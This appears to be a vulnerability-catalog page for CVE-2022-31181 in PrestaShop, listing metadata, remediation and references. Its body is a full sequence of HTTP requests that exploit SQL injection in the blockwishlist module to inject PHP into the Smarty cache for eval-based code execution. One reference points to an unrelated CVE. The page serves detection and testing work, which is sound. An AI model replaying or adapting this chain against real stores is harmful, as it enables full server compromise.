---
layout: post
cve_id: CVE-2022-31181
title: PrestaShop - SQL Injection to Eval Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-31181.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-31181.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: critical
remediation: 'Upgrade to version 1.7.8.7 or later. Alternatively, delete the MySQL
  Smarty cache feature if upgrade is not possible.

  '
impact: 'Attackers can execute arbitrary PHP code, leading to remote code execution
  and full system compromise

  '
reference:
- https://www.xmco.fr/wp-content/uploads/2022/12/XMCO-ActuSecu-59-Forwardshell-UXSS-cyberguerre.pdf
- https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-hrgx-p36p-89q4
- https://github.com/PrestaShop/PrestaShop/commit/b6d96e7c2a4e35a44e96ffbcdfd34439b56af804
- https://nvd.nist.gov/vuln/detail/CVE-2025-27007
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-31181
  epss-score: 0.72653
  epss-percentile: 0.98721
  cwe-id: CWE-89,CWE-74
  cpe: cpe:2.3:a:prestashop:prestashop:*:*:*:*:*:*:*:*
metadata:
  verified: true
  vendor: prestashop
  product: prestashop
  shodan-query:
  - http.component:"Prestashop"
  - cpe:"cpe:2.3:a:prestashop:prestashop"
  - http.component:"prestashop"
tags:
- cve
- cve2022
- prestashop
- rce
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
PrestaShop versions from 1.6.0.10 and before 1.7.8.7 contain an SQL injection caused by unsanitized user input, letting attackers chain the vulnerability to call PHP's Eval function, exploit requires attacker to send malicious input.


## üåê HTTP Request
```nohighlight
POST /login?create_account=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0
Connection: close
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id_gender=1&firstname=vhdt&lastname=zqzd&email=FyPXNd@PgZMG.com&password=aUApVPLi&birthday=&customer_privacy=1&psgdpr=1&submitCreate=1
```

```nohighlight
GET /module/blockwishlist/action?action=getAllWishlist HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /module/blockwishlist/action?action=addProductToWishlist HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0
Connection: close
Content-Length: 96
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
params[id_product]=1&params[idWishList]=1Nw9sl&params[quantity]=0&params[id_product_attribute]=0
```

```nohighlight
POST /module/blockwishlist/view HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Connection: close
Content-Length: 126
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id_wishlist=1Nw9sl&order=product.price;UPDATE+ps_configuration+SET+value+=1+WHERE+name+LIKE+'%_SMARTY_CACHE';--.desc&from-xhr=
```

```nohighlight
POST /module/blockwishlist/view HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15
Connection: close
Content-Length: 139
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id_wishlist=1Nw9sl&order=product.price;UPDATE+ps_configuration+SET+value+='mysql'+WHERE+name+LIKE+'%_SMARTY_CACHING_TYPE';--.desc&from-xhr=
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.6
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /module/blockwishlist/view HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0.1 Safari/605.1.15
Connection: close
Content-Length: 127
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id_wishlist=1Nw9sl&order=product.price;UPDATE+ps_smarty_cache+SET+content=concat(content,"echo+md5('5530');");--.desc&from-xhr=
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /module/blockwishlist/view HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Connection: close
Content-Length: 131
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id_wishlist=1Nw9sl&order=product.price;UPDATE+ps_smarty_cache+SET+content=REPLACE(content,"echo+md5('5530');","");--.desc&from-xhr=
```

```nohighlight
POST /module/blockwishlist/view HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
Connection: close
Content-Length: 126
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id_wishlist=1Nw9sl&order=product.price;UPDATE+ps_configuration+SET+value+=0+WHERE+name+LIKE+'%_SMARTY_CACHE';--.desc&from-xhr=
```

```nohighlight
POST /module/blockwishlist/view HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/9.0
Connection: close
Content-Length: 144
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id_wishlist=1Nw9sl&order=product.price;UPDATE+ps_configuration+SET+value+='filesystem'+WHERE+name+LIKE+'%_SMARTY_CACHING_TYPE';--.desc&from-xhr=
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/12.0
Connection: close
Accept-Encoding: gzip
```

